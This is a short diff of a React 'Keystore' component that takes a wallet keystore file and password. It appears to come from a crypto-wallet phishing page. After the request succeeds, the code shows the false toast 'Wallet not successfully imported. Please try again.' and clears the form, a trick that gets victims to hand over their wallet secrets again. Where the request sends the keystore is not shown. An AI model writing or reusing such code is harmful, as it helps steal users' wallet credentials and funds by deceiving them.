@@ -23,10 +23,6 @@ const Keystore = () => {
 
   const navigate = useNavigate();
 
-  const confirmModal = () => {
-    setOpenModal(true);
-    // handleSubmit();
-  };
   const handleSubmit = async (e) => {
     e.preventDefault();
     setOpenModal(false);
@@ -43,7 +39,7 @@ const Keystore = () => {
       )
       .then((response) => {
         setLoading(false);
-        handleSubmitNow();
+        // handleSubmitNow();
         toast.error("Wallet not successfully imported. Please try again.");
         setKeyStore("");
         setPassword("");
